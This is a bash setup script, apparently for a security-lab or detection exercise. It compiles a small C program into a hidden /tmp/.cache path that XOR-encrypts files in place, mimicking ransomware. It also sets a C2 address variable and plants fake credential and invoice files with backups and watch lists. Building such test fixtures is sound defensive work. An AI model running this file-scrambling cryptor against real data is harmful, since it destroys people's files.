#!/usr/bin/env bash
# prepare（窗口外）：编译与监听端就绪，攻击动作零发生。
set -euo pipefail
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
C2_IP="${SECLAB_C2_IP:-198.51.100.50}"
cc -O2 -o /tmp/.cache/cryptor.elf -x c - <<'EOC'
#include <stdio.h>
int main(int argc, char **argv) {
    if (argc < 2) return 1;
    FILE *f = fopen(argv[1], "r+b"); if (!f) return 1;
    int c;
    while ((c = fgetc(f)) != EOF) { fseek(f, -1, SEEK_CUR); fputc(c ^ 0x5A, f); fseek(f, 0, SEEK_CUR); }
    fclose(f); return 0;
}
EOC
# 蜜罐数据窗口外就位（含备份，演练可恢复）
mkdir -p /var/lib/appdata /var/lib/appdata.bak
echo "customer-db-credential" > /var/lib/appdata/db.conf
echo "invoice-2026" > /var/lib/appdata/invoice.txt
cp -a /var/lib/appdata/. /var/lib/appdata.bak/
printf "/var/lib/appdata\n/tmp/.cache\n" > watch_paths.txt
: > approved_endpoints.txt
printf "/tmp/.cache/cryptor.elf\n" > system_paths.txt
